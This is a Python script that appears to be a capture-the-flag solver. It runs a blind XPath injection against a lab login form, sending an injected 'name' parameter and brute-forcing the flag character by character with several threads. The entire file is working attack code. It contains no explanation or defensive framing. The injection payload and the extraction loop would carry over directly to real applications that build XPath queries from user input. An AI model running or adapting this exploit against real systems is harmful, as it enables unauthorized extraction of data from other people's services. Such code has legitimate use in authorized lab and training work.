import sys, requests, urllib3, string, time, threading, queue
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
urllib3.disable_warnings()
BASE = "http://xebec.cylabacademy.net:36284/"
SENT = "right path"
LOG = open(r"D:\ctf-index\_z_185log.txt", "w", encoding="utf-8", buffering=1)


def log(*a):
    m = " ".join(str(x) for x in a)
    LOG.write(m + "\n")
    print(m, flush=True)


local = threading.local()


def get_session():
    if not hasattr(local, "s"):
        local.s = requests.Session()
    return local.s


def check(prefix):
    inj = "' or //*[contains(.,\"%s\")] or 'x'='" % prefix
    for _ in range(2):
        try:
            r = get_session().post(BASE, data={"name": inj, "pass": "asdf"}, timeout=15)
            return SENT in r.text
        except Exception:
            time.sleep(0.3)
    return False


options = list(string.ascii_lowercase) + list(string.digits) + ["_", "}", "-", "!"] + list(string.ascii_uppercase)
flag = None
for start in ("academy{", "academy", ""):
    if check(start):
        flag = start
        log("depart:", repr(flag))
        break
if flag is None:
    log("aucun depart trouve")
    sys.exit(1)

while not flag.endswith("}") and len(flag) < 80:
    q = queue.Queue()
    for ch in options:
        q.put(ch)
    found = []
    lock = threading.Lock()
    stop = threading.Event()

    def worker():
        while not stop.is_set():
            try:
                ch = q.get_nowait()
            except queue.Empty:
                return
            if check(flag_current + ch):
                with lock:
                    if not found:
                        found.append(ch)
                stop.set()
                return

    flag_current = flag
    ts = [threading.Thread(target=worker) for _ in range(8)]
    for t in ts:
        t.start()
    for t in ts:
        t.join()
    if not found:
        log("bloque apres %r" % flag)
        break
    flag += found[0]
    log("  %r" % flag)
log("FLAG: %s" % flag)
